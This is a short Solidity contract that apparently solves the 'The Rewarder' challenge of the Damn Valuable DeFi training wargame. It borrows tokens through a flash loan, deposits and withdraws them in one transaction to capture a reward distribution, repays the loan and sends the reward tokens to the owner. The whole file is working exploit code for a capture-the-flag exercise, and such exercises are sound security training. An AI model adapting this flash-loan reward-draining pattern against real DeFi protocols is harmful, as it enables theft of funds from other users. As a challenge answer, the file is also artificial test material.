// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

contract RewarderA{
    FlashLoanerPool pool;
    TheRewarderPool rewardpool;
    DamnValuableToken public immutable liquiditytoken;
    address payable owner;
    constructor(
        address pool_address,
        address token_address,
        address rewardp_address,
        
        address payable owner_address
    ){
        pool = FlashLoanerPool(pool_address);
        rewardpool = TheRewarderPool(rewardp_address);
        liquiditytoken = DamnValuableToken(token_address);
        owner = owner_address;

        //hrllo
    }
    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }
    function receiveFlashLoan(uint256 amount) external {
        liquiditytoken.approve(address(rewardpool), amount);

        rewardpool.deposit(amount);
        rewardpool.withdraw(amount);

        liquiditytoken.transfer(address(pool), amount);

        uint256 curr_balance = rewardpool.rewardToken().balanceOf(address(this));
        rewardpool.rewardToken().transfer(owner,curr_balance);
    }
}
